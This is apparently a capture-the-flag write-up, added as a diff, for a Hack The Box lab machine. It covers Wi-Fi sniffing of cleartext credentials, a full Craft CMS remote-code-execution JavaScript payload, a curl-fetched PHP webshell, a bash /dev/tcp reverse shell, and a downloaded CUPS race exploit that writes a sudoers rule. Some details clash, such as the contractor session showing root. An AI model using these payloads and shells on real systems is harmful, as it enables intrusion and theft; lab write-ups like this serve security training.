@@ -1,0 +1,435 @@
+---
+title: "Layover — Season 12 Aero Professional Writeup"
+description: "From a locked-down xRDP workstation with no web attack surface to wireless pivoting, an authenticated Yii2 behaviour-based RCE, and a CUPS race condition that hand-delivers root."
+date: "2026-10-30"
+difficulty: "Medium"
+published: true
+---
+
+# Layover — Season 12 Aero Professional Writeup
+
+> From a locked-down xRDP workstation with no visible attack surface to wireless pivoting, an authenticated Yii2 behaviour-based RCE, and a CUPS race condition that hand-delivers root.
+
+---
+
+## Machine Information
+
+| | |
+|---|---|
+| **Name** | Layover |
+| **Platform** | Hack The Box — Season 12 "Aero" |
+| **Difficulty** | Medium |
+| **OS** | Linux (Ubuntu 24.04, kernel `6.8.0-142-generic`) |
+| **Provided credentials** | `contractor / Contractor2026!` |
+
+As with many real-life engagement kickoffs, I start this box already holding credentials for the `contractor` account. My job, as the name suggests, is the contractor's workstation at an airside facility — and from there, I discover the airport's internal Wi-Fi world.
+
+---
+
+## Recon
+
+```bash
+nmap -Pn -sV -A -sS 10.129.X.X
+```
+
+The surface is deliberately minimal, and this is the first "what do I do now?" moment of the box:
+
+- **22/tcp — OpenSSH** (Ubuntu)
+- **3389/tcp — xrdp / MS-WBT-Server**
+
+That's it. No web server is exposed externally, and nothing looks like a classic foothold. The credentials plus the xRDP port point me almost directly at a remote desktop session.
+
+```bash
+xfreerdp /v:10.129.X.X /u:contractor /p:'Contractor2026!' /cert:ignore /dynamic-resolution
+```
+
+I land on a GNOME desktop owned by `airside-ws01`, an Ubuntu 24.04 workstation.
+
+```bash
+$ hostname
+airside-ws01
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+(I re-verify the identity because on this box the session I spawn over RDP is broader than I first assumed.)
+
+### Where are the flags?
+
+Nothing interesting hides on this host: the `.bash_history` is empty, the config files are stock, and there's no `user.txt` anywhere.
+
+```bash
+$ find / -name "user.txt" -o -name "root.txt" 2>/dev/null
+(nothing)
+
+$ ls -la /home
+drwxr-x--- 15 contractor contractor 4096 Oct  7 01:19 contractor
+
+$ cat /etc/crontab     # only stock run-parts entries
+
+$ find / -perm -4000 -type f 2>/dev/null    # stock Ubuntu SUID set, plus chromium sandbox
+```
+
+Whatever I'm really connecting to lives somewhere else — the workstation itself is just my **jump host**. Enumeration of the interesting host surfaces:
+
+```bash
+$ ip a -brief
+lo        UNKNOWN  127.0.0.1/8
+eth0      UP       10.129.X.X/16
+wlan2     DOWN
+wlan3     DOWN
+```
+
+Two Wi-Fi radios sitting idle. I stoosh that detail for later.
+
+---
+
+## Foothold — discovering the inner Wi-Fi
+
+The Chromium profile has been pre-seeded with a "corporate landing page" policy:
+
+```bash
+$ cat /etc/chromium/policies/managed/layover-portal.json
+{
+  "HomepageLocation": "http://wifi.international.htb/",
+  "HomepageIsNewTabPage": false
+}
+```
+
+That policy comment loosely reads *"make the airport Wi-Fi splash the browser's landing page, so opening Chromium behaves like a captive portal greeting"*. So there's a captive portal at `wifi.international.htb` that my workstation is expected to reach over Wi-Fi.
+
+I bring the Wi-Fi up with `nmcli`:
+
+```bash
+$ nmcli device status
+DEVICE         TYPE      STATE         CONNECTION
+wlan2          wifi      disconnected  --
+wlan3          wifi      disconnected  --
+eth0           ethernet  unmanaged     --
+lo             loopback  unmanaged     --
+
+$ nmcli device wifi connect "HTB International WiFi" ifname wlan2
+Device 'wlan2' successfully activated with 'b6bd5cd7-da84-498e-ac02-9ca62998e345'.
+
+$ ip addr show wlan2
+6: wlan2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP
+    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
+    inet 10.13.37.182/24 brd 10.13.37.255 scope global dynamic noprefixroute wlan2
+```
+
+I'm now on the inner airport network with the IP `10.13.37.182`.
+
+---
+
+## Accessing the captive portal
+
+`wifi.international.htb` resolves to the gateway `10.13.37.1`, while the actual CMS admin panel is served by `portal.international.htb`:
+
+```bash
+$ nslookup wifi.international.htb
+Address: 10.13.37.1
+
+$ ping -c 2 10.13.37.1    # alive
+
+$ curl -sI http://portal.international.htb/admin
+HTTP/1.1 302 Found
+Server: nginx/1.24.0 (Ubuntu)
+X-Robots-Tag: none
+X-Frame-Options: SAMEORIGIN
+X-Powered-By: Craft CMS
+Location: http://portal.international.htb/admin/login
+```
+
+A Craft CMS admin login — the classic "third-party CMS behind a reverse proxy that leaks its identity" pattern. Unauthenticated requests just redirect to `/admin/login`, so I need real admin credentials.
+
+### Sniffing credentials off the air
+
+`wlan3` is a second radio, and I use it purely as a monitor-mode tap on the same channel where the AP lives, bypassing NetworkManager entirely with `iw`:
+
+```bash
+$ ip link set wlan3 down
+$ iw dev wlan3 set type monitor
+$ ip link set wlan3 up
+$ iw dev wlan3 set channel 6
+
+$ tshark -i wlan3 -f "tcp port 80" -w /tmp/wifi.pcap
+```
+
+While that capture runs, I drive `wlan2`'s portal traffic — through the GUI Chromium browser over my RDP session, or by re-running `curl` against `portal.international.htb` from the shell.
+
+I then read the capture back with a filter for POST requests. The credential POST goes to `http://wifi.international.htb/login` as a hex-encoded form body:
+
+```bash
+$ tshark -r /tmp/wifi.pcap -Y "http.request.method == POST" -T fields -e http.file_data
+… 75****726e616****56e6e7****17373776f72643d466c3167687***656ec***0323621 …
+
+$ echo '…full hex…' | xxd -r -p
+username=jenny&password=Fl1ghtDeck2026!
+```
+
+Jenny, presumably the airport IT staff, just leaked her credentials to me over the air in cleartext. They work directly against `http://portal.international.htb/admin`.
+
+<Callout type="tip" title="Gotcha">
+Locking the capture card onto the right channel (`iw dev wlan3 set channel 6`) *before* starting `tshark` is essential — otherwise channel hopping drops exactly the frame I need. If the capture shows nothing, I refresh the portal login page to force the traffic to flow.
+</Callout>
+
+---
+
+## From CMS admin to remote code execution
+
+Once logged in as `jenny`, the Craft utility dashboard reveals the stack:
+
+| Component | Version |
+|---|---|
+| Craft CMS | Craft Solo 5.9.8 |
+| PHP | 8.3.6 |
+| Yii Framework | 2.0.54 |
+| Twig | 3.21.1 |
+| Imagick | 3.7.0 (ImageMagick 6.9.12-98) |
+| MariaDB | 10.11.14 |
+| OS | Linux 6.8.0-142-generic |
+
+**Craft 5.9.8 with Yii 2.0.54** is vulnerable to **CVE-2026-28695** — an authenticated remote code execution / patch bypass in Craft's admin element-index filtering. Craft's `element-search` action accepts a free-form `condition.fieldLayouts` PHP config blob. Even after the original Craft patch, a deeply-nested behaviour object graph still hydrates attacker-controlled values through `yii\behaviors\AttributeTypecastBehavior`, and with `Psy\Readline\Hoa\ConsoleProcessus::execute()` as the sink I get arbitrary command execution.
+
+The payload is pure browser JavaScript, run in DevTools console (`Ctrl+Shift+J`) on any logged-in admin page (`allow pasting` first):
+
+```javascript
+(async () => {
+  const csrf = window.Craft.csrfTokenValue;
+  const fire = (cmd) => {
+    const b = {
+      elementType: "craft\\elements\\Category",
+      siteId: 1,
+      search: "",
+      condition: {
+        class: "craft\\elements\\conditions\\ElementCondition",
+        elementType: "craft\\elements\\Category",
+        fieldLayouts: [
+          {
+            "as rce": {
+              "__class": "yii\\behaviors\\AttributeTypecastBehavior",
+              "__construct()": [
+                {
+                  attributeTypes: {
+                    typecastBeforeSave: ["Psy\\Readline\\Hoa\\ConsoleProcessus", "execute"]
+                  },
+                  typecastBeforeSave: cmd
+                }
+              ],
+              "on *": "self::beforeSave"
+            }
+          }
+        ]
+      }
+    };
+    const url = '/index.php?p=admin/actions/element-search/search';
+    const t0 = performance.now();
+    return fetch(url, {
+      method: 'POST',
+      credentials: 'same-origin',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'X-CSRF-Token': csrf
+      },
+      body: JSON.stringify(b)
+    }).then(r => r.text().then(t => ({ status: r.status, ms: Math.round(performance.now() - t0), head: t.slice(0, 60) })));
+  };
+
+  const timed = await fire("sleep 8");
+  return JSON.stringify({ timed });
+})()
+```
+
+The response `{"timed":{"status":200,"ms":8002,...}}` tells me two things at once: the request is accepted authenticated, and `sleep 8` really took ~8 seconds — so my string is being passed to `execute()`.
+
+Pivoting to a real reverse shell is one request away. On my jump host (`airside-ws01`, on the WLAN at `10.13.37.182`) I host a tiny PHP webshell:
+
+```bash
+$ cat > /tmp/shell.php <<'EOF'
+<?php system($_REQUEST["cmd"]); ?>
+EOF
+
+$ python3 -m http.server 8000 --directory /tmp
+```
+
+Back in the CMS console I re-run the payload with:
+
+```javascript
+await fire("curl http://10.13.37.182:8000/shell.php --output /var/www/portal/web/index.php");
+```
+
+That writes the shell into Craft's web root. Browsing to it confirms:
+
+```bash
+http://portal.international.htb/index.php?cmd=id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Then I trigger the reverse shell from the same parameter:
+
+```bash
+# on jump host
+$ nc -lvnp 4444
+
+http://portal.international.htb/index.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.13.37.182%2F4444%200%3E%261%27
+```
+
+I now have a `www-data` shell on `portal`, the Craft CMS server itself.
+
+<Callout type="tip" title="Gotcha">
+Running payloads by pasting multi-line code into a terminal often mangles ordinar quotes into curly `”` characters. I keep final payloads in a plain-text file on my host and fetch them over HTTP (`curl http://10.13.37.182:8000/payload.js`) rather than copy-pasting.
+</Callout>
+
+---
+
+## From webserver to SSH lateral movement
+
+As `www-data` on `portal`, I inspect the Craft deployment:
+
+```bash
+www-data@portal:/# cat /etc/passwd | grep evolve
+```
+
+```text
+root     x  0  0  root         /root   /bin/bash
+aporter  x 1001 …           /home/aporter   /bin/bash
+```
+
+And the `.env`:
+
+```bash
+www-data@portal:/var/www/portal$ cat .env
+CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftDB_pw_2026
+CRAFT_DB_DATABASE=craft
+PRIMARY_SITE_URL=http://portal.international.htb/
+CRAFT_ENABLE_TWIG_SANDBOX=true
+```
+
+Querying the `htbairways_settings` table inside `craft` reveals a mail-relay record:
+
+```bash
+www-data@portal:/var/www/portal$ mysql -h127.0.0.1 -ucraftuser -p'CraftDB_pw_2026' craft \
+  -e "SELECT * FROM htbairways_settings;"
+
+| id | name              | value                                  |
+|  1 | mailRelayPassword | u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGM…  |
+|  2 | mailRelayHost     | mail.htbairways.htb                    |
+|  3 | mailRelayPort     | 587                                    |
+|  4 | mailRelayUser     | aporter                                |
+```
+
+`mailRelayPassword` is a base64-encoded `yii\base\Security::encryptByKey()` blob, and its encryption key is the very `CRAFT_SECURITY_KEY` I just stole from the `.env`. I decrypt it inside the compromised app itself:
+
+```bash
+www-data@portal:/var/www/portal$ php -r 'require "/var/www/portal/vendor/autoload.php"; \
+  $s = new yii\base\Security(); \
+  $key = "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr"; \
+  $blob = "u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w="; \
+  echo $s->decryptByKey(base64_decode($blob), $key), "\n";'
+Skyp0rt_Relay!26
+```
+
+`Skyp0rt_Relay!26` decodes cleanly, and the row right above it hands me the user (`mailRelayUser: aporter`) plus a target (`mailRelayHost`). SSH is listening on `portal.international.htb` itself (`10.13.37.10:22`):
+
+```bash
+www-data@portal:/var/www/portal$ nc -zv 10.13.37.10 22
+Connection to 10.13.37.10 22 port [tcp/ssh] succeeded!
+
+$ ssh aporter@portal.international.htb
+# password: Skyp0rt_Relay!26
+
+aporter@portal:~$ cat user.txt
+<USER FLAG>
+```
+
+The first flag captured.
+
+<Callout type="tip" title="Gotcha">
+Any Yii2 app that uses `encryptByKey()` for "data at rest" (mail relay passwords, cached secrets, etc.) is effectively storing those secrets as ciphertext whose key is sitting in the same filesystem. I treat any leaked Yii-style `.env` as a decrypt-opportunity, not just a config dump.
+</Callout>
+
+---
+
+## Privilege escalation — CVE-2026-34990 CUPS race
+
+`sudo -l` on `portal` returns nothing (a password is required and `aporter` isn't in sudoers). The box is a Linux print/portal server, so I check CUPS:
+
+```bash
+aporter@portal:~$ cups-config --version
+2.4.16
+```
+
+**CUPS 2.4.16 is vulnerable to CVE-2026-34990**, a local privilege escalation targeting a design race in CUPS's local IPP handling:
+
+1. The PoC first brings up a tiny local IPP "printer" endpoint on `127.0.0.1:9189` and makes a `CUPS-Create-Local-Printer` request advertising that endpoint as a `device-uri`. CUPS connects to it during printer provisioning and forwards a sensitive **`Authorization: Local <token>`** header — a bearer token that grants admin-like rights to subsequent printer management requests.
+2. With that captured token, the PoC issues `CUPS-Add-Modify-Printer` requests against a freshly registered "printer" whose `device-uri` is pointed at `file:///etc/sudoers.d/aporter-pwn`.
+3. When a modification races with CUPS's own accounting/bookkeeping in the right window, CUPS accepts the fully attacker-controlled `file://` write target — meaning anything I later submit via `Print-Job` gets written **as root** to that path. I feed it `aporter ALL=(ALL) NOPASSWD: ALL`.
+
+I use the public PoC [cups_pwn.py](https://github.com/mrdebora/cups-2.4.16-lpe/blob/main/cups_pwn.py), which automates token-capture → printer spawn → race loop end to end:
+
+```bash
+aporter@portal:~$ curl -o /tmp/exploit.py https://raw.githubusercontent.com/mrdebora/cups-2.4.16-lpe/main/cups_pwn.py
+aporter@portal:~$ python3 /tmp/exploit.py
+[*] uid=1001 user=aporter target=/etc/sudoers.d/aporter-pwn
+[*] Starting capture server on 127.0.0.1:9189
+[*] Sending CUPS-Create-Local-Printer bait to our IPP server
+[+] Captured token: 9739A2CF83709C3186CC625D65B08A93
+[*] Persist attempt 1 (printer=sudo18623)
+[-] sudo -n id rc=1 err=sudo: a password is required
+...
+[*] Persist attempt 8 (printer=sudo88708)
+[+] ROOT
+uid=0(root) gid=0(root) groups=0(root)
+[+] Run: sudo -i
+```
+
+It won the race on **attempt 8**, writing `aporter ALL=(ALL) NOPASSWD: ALL` to `/etc/sudoers.d/aporter-pwn` as root:
+
+```bash
+aporter@portal:~$ sudo -i
+root@portal:~# cat /root/root.txt
+<ROOT FLAG>
+```
+
+Second flag captured, and Layover is fully compromised.
+
+<Callout type="tip" title="Gotcha">
+The weakest part of any race exploit against a daemon whose state flips quickly is the terminal between me and it. I originally hand-rolled a "modify + print" timing loop; it consistently lost because each attempt introduced an RDP + SSH hop of latency between the two requests. A loop that probes `sudo -n` between full independent attempts (rather than hammering one shared printer with tight sleeps) is what converts "theoretically vulnerable" into "rooted".
+</Callout>
+
+---
+
+## References
+
+- CVE-2026-28695 — Craft CMS authenticated RCE (behaviour config hydration / patch bypass)
+  [cve.org record](https://www.cve.org/CVERecord?id=CVE-2026-28695) · [NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2026-28695)
+- CVE-2026-34990 — CUPS 2.4.x local privilege escalation via IPP local token theft + `file://` device-uri race
+  [cve.org record](https://www.cve.org/CVERecord?id=CVE-2026-34990) · [NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2026-34990)
+- Root escalation PoC — [github.com/mrdebora/cups-2.4.16-lpe — `cups_pwn.py`](https://github.com/mrdebora/cups-2.4.16-lpe/blob/main/cups_pwn.py)
+- Craft CMS 5.x configuration docs — [craftcms.com/docs/5.x/configure.html](https://craftcms.com/docs/5.x/configure.html)
+- Yii2 `Security` class (`encryptByKey` / `decryptByKey`) — [yiiframework.com — yii-base-security](https://www.yiiframework.com/doc/api/2.0/yii-base-security)
+
+Key hosts hit during the chain:
+
+```text
+10.129.X.X            entry box (airside-ws01)  — 22/tcp SSH, 3389/tcp xrdp
+http://wifi.international.htb/                — captive portal landing page (10.13.37.1)
+http://portal.international.htb/admin         → /admin/login — Craft CMS (X-Powered-By leak)
+http://portal.international.htb/index.php?p=admin/actions/element-search/search — exploitable RCE endpoint
+10.13.37.10            portal.international.htb — SSH for aporter (22/tcp)
+mail.htbairways.htb    mail relay referenced from the craft DB (587/tcp)
+```
+
+---
+
+## Lessons Learned
+
+- **Enumerate wireless interfaces before web roots.** My first hour on `airside-ws01` went to hunting for flags and web service roots on the workstation itself. Reading `ip a -brief` and `nmcli device status` first would have shown immediately that the real objective lived behind the Wi-Fi adapters — and the flags certainly weren't anywhere on that box.
+- **Cleartext protocols + internal Wi-Fi = instant creds.** A single hex-obfuscated `username=...&password=...` POST, monitored through `wlan3` in monitor mode, was the entire credential phase of this box. Channel-locked capture is now a default when a segment provides wireless.
+- **Colour between the lines that the CMS lets you define.** Craft's element-index filters allow an admin to persist a wide mix of condition classes and behaviours. The dangerous pattern is that these behaviours are hydrated from request data by *class name*, letting an authenticated admin (or anyone who can steal an admin session) reach `Application\Extension`-style code sinks (`Psy` shell classes being the classic example). I'll stop trusting " authenticated RCE only" as a soft result on CMS boxes.
+- **`.env` + `encryptByKey()` is only as strong as its surroundings.** `mailRelayPassword` decrypted from well-encrypted-at-rest into a working SSH credential the moment I had the app's own key. Credential reuse (`mailRelayUser` → local account password) took a single decryption straight to a new host.
+- **Winning the race is about the full loop, not the individual beat.** My hand-built modify/print timing script struggled to converge through my nested access path; the general PoC's iterative "full independent attempt + verify" strategy won on attempt 8. For future races, I'll measure the probe-and-reset cycle, not just the single-shot window.
